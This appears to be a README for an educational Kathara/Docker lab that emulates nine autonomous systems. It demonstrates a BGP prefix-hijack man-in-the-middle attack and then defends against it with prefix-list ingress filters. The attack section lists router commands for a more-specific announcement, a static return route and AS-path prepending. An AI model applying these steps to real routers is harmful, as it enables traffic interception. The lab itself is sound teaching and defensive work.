# Virtualisation of Internet Insecurity Demonstration

The lab is designed to facilitate a MITM Attack using BGP Prefix Hijacking.
![Final Network Topology Design](https://user-images.githubusercontent.com/37820793/190728275-79b66976-c6a7-4d62-a493-51138625bbfa.png)
The network topology consists of nine autonomous systems ranging from ASN-1 to ASN-9 including the ATTACKER and VICTIM ASes. The VICTIM AS is ASN-2 and the ATTACKER AS is ASN-8. Each autonomous system consists of one router and one server and all the routers are configured to be bgp speakers. Scripts are launched on the servers to execute commands via SSH on the routers to automate the MITM attack or apply prefix filters to prevent the attack. TCP dump is also set up on the DUMP-SERVER of ASN-8 to analyse hijacked traffic intended for ASN-2 once the attack is launched.

Since commands will be executed on the routers via the servers, the device.startup files of each server are used to set up SSH connections between the servers and routers and also write the python programs required to launch the attack and set up the prefix filters on the servers.

The attacker AS (ASN-8) announces 200.7.0.0/24 which is a subnet of the prefix assigned to ASN-2. This announcement will cause the prefix 200.7.0.0/16 and 200.7.0.0/24 to overlap. When prefixes overlap, BGP uses the longest prefix match rule. Due to this rule, announcing 200.7.0.0/24 will cause all the ASes to learn this route thus discarding the route to 200.7.0.0/16 previously learnt from ASN- 2’s announcement. All the traffic intended for ASN-2 will be forwarded to ASN-8.

A reply path is constructed by declaring a route path to forward the traffic to the VICTIM AS. This ensures that the attack goes unnoticed and prevents the MOAS conflict problem that may cause loops leading network downtime. ASN-8 blinds part of the network to the attack, with the aim of establishing a viable path to the victim. This is achieved by manipulating the AS Path attribute using AS Path Prepending. ASN-8 does this by announcing 200.7.0.0/24 and prepending 5, 1 and 2 to the AS path. AS 5 will not accept a route announcement that has its own AS number 5 hence it will not learn the bogus route announced by ASN-8. All traffic intended for ASN-2 will be intercepted by ASN-8 and forwarded to ASN-2 via the viable path. The dumpserver.startup file creates a python script to launch the attack and construct the the reply path.

## Basic Requirements

1. Make sure the latest version of Docker is installed - https://docs.docker.com/get-docker/
2. Python3.8 - https://www.python.org/downloads/
3. Make sure the latest version of Kathara is installed - https://www.kathara.org/

### To run this project successfully, a custom docker image must be created for kathara. Paramiko is needed to establish the SSH connection and must be installed by creating the custom docker image and running the kathara lab with this image.

1. Pull the latest kathara/quagga image:

```
$ docker pull kathara/quagga
```

2. Create copy of existing kathara/quagga image called “custom-kathara-image”:

```
$ docker run -tid --name custom-kathara-image kathara/quagga
```

3. Bash prompt for the custom-kathara-image container to manually install packages needed for this lab:

```
$ docker exec -ti custom-kathara-image bash
```

```
$ apt update
```

4. Install paramiko python module needed to send the commands via ssh to the router in the lab:

```
$ apt-get install -y python3-paramiko
```

```
$ exit
```

5. Commit the changes that have been made to the custom-kathara- image

```
$ docker commit custom-kathara-image kathara/custom-kathara-image
```

6. Remove the running container “custom-kathara-image” since the packages have now been installed:

```
$ docker rm -f custom-kathara-image
```

7. List the docker images that have been created. "kathara/custom-kathara-image" should be listed:

```
$ docker image ls
```

# Running the lab

## Lauch the MITM attack

1. To run the lab with the custom kathara image go to the lab directory, open a terminal and type:

```
$ kathara lstart -o “image=kathara/custom-kathara-image”
```

2. To lauch the attack run the following commands:

```
$ kathara connect router8
```

```
$ conf t
```

```
$ router bgp 8
```

```
$ network 200.7.0.0/24
```

```
$ ip route 200.7.0.0 255.255.255.0 216.239.32.1
```

3. The following for the as path prepend and route map:

```
$ route-map to-router5 permit 10
```

```
$ match ip address 10
```

```
$ set as-path prepend 5 1 2
```

```
$ exit
```

```
$ router bgp 8
```

```
$ neighbor 216.239.32.1 route-map to-router5 out
```

```
$ exit
```

```
$ do clear ip bgp *
```

## Automate the Attack

1. Launch the attack with the python script on the dumpserver

```
$ kathara connect dumpserver
```

```
$ python3 launchAttack.py
```

## Prevent and recover from the attack

For this lab prefix lists will be used to prevent and recover from the MITM attack and the type of prefix list to be used is ingress filters. The assumption made here is that ASN-2 has registered 200.7.0.0/16 with the Internet Routing Registry body. This means that other ASes are aware of the legitimate prefix of ASN-2 and so they use this information to create prefix-lists to filter out bogus announcements. Prefix lists are created for each neighbour of the routers and are set to reject prefixes that are greater than or equal to /17.

1. In this example an ingress filter called partialInRouter8 is created for 202.43.176.1 which is a neighbour of router 9.

```
$ kathara connect router9
```

```
$ vtysh
```

```
$ conf t
```

```
$ router bgp 9
```

```
$ neighbor 202.43.176.1 prefix-list partialInRouter8 in
```

```
$ ip prefix-list partialInRouter8 deny 200.7.0.0/17 le 32
```

```
$ ip prefix-list partialInRouter8 permit any
```

```
$ router bgp 9
```

```
$ neighbor 180.20.20.5 prefix-list partialInRouter6 in
```

```
$ ip prefix-list partialInRouter6 deny 200.7.0.0/17 le 32
```

```
$ ip prefix-list partialInRouter6 permit any
```

```
$ do clear ip bgp *
```

```
$ exit
```

Python scripts to apply prefix lists are created on each of the dumpservers of the routers except the the attacker AS (AS-8).

## Run the lab with the python script developed - Make sure docker is up and running.

1. To install the python virtual environment package go to the lab directory and type:

```

$ python3 -m pip install virtualenv

```

2. To create a virtual environment type:

```

$ python3 -m venv venv

```

3. To activate the virtual environment type:

```

$ source venv/bin/activate.

```

4. To install packages required for project type:

```

$ python -m pip install -r requirements.txt

```

5. To start the python program type:

```

$ python graph.py

```

6. To view the tool in the browser, go to port 5050 on your localhost (eg. 127.0.0.1:5050)
7. Press play at the button left corner to render the canvas. (Depending on your screen resolution, you may have to zoom out to 90% to view the full topology).
8. First of all, click the startbutton to start the lab and display the network topology.
9. Afterwards, depending on what you want to test you can either click the Apply Route Filters, Display Route Path, Launch Attack or Stop the Lab.
